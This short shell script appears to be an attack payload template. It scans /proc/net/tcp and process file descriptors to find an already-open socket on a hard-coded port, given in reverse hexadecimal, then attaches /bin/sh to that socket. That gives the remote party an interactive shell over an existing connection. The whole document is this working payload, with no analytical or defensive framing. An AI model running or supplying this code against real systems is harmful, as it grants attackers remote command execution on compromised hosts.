PORT="%s" #HARDCODE YOUR PORT HERE IN REVERSE HEXIDECIMAL

ADDRS=$(echo $(cat /proc/net/tcp | tail -n +2 | awk '{print $3}') );
INODES=$(echo $(cat /proc/net/tcp | tail -n +2 | awk '{print $10}') );
TCP=$(cat /proc/net/tcp  | tail -n +2);
PPIDS=$(ps | tail -n +2 | awk '{print $1}');

SOCKET_FDS=""
for pid in $PPIDS;
do
  SOCKET_FDS=$(ls -la /proc/$pid/fd | awk '/socket/' | awk '{print $9,$11}' | tr -d 'socket:[]'); 
  if [ ! -z "$SOCKET_FDS" ];
  then
    break;
  fi
done

REVSH () {
    `/bin/sh <&$1 >&$1 2>&$1`
}

echo "${TCP}" |
while read -r tcpline; do
  echo "${SOCKET_FDS}" |
  while read -r fdline; do
    INODE=$(echo "${fdline}" | awk '{print $2}');
    FD=$(echo "${fdline}" | awk '{print $1}');
    
    case "$tcpline" in 
        *"${INODE}"* ) case "$tcpline" in 
            *"${PORT}"* ) REVSH $FD; exit 1;;
        esac
    esac  
  done
done
